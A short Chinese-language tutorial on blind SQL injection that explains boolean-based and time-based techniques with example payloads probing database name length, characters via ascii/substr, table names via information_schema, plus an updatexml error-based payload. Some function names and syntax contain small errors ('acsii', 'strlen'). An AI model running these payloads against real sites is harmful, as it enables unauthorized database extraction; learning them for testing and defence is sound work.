SQL注入--盲注

为何要使用盲注

  • 盲注主要是因为管理员关闭了回显,你无法得知返回得报错,所以只能通过盲注来实现注入攻击

常用函数

  • strlen(),substr(str,pos,len),acsii(),sleep(),if(flag?true:false)

主要流程

select * from table_name where id=1 and 1=1页面正常返回

select * from table_name where id=1 and 1=2页面错误返回
所以开始利用这个页面返回是否正常来完成注入

  1. select * from table_name where id=1 and length(database())>5 开始根据页面返回来判断数据库字符长度,然后疯狂改变5测出真实长度
  2. select * from table_name where id=1 and acsii(substr(database(),1,1))=111
    然后就是配合截取函数和acscii函数一个一个的判断字符.这可以使用burp功能模块来帮助快速完成,或者是sqlmap.不然如果太长手工破解会很累
  3. select * from table_name where id=1 and length(select table_name from database())=5
    测试第一个表名的长度…
  4. select * from table_name where id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1))>97
    然后就是一个一个的判断表名
  5. 以此类推….

延时注入

延时注入也是盲注的一种,只不过又换了两个函数利用,变成了if和sleep.举个小小的栗子,select * from table_name where id=1 and if(length(database())<11,sleep(5),1) -- wqed"如果数据库名<11就沉睡5秒

注入优先级

显错注入>报错(updatexml(0x7e,sql,1))>布尔盲注>延时注入
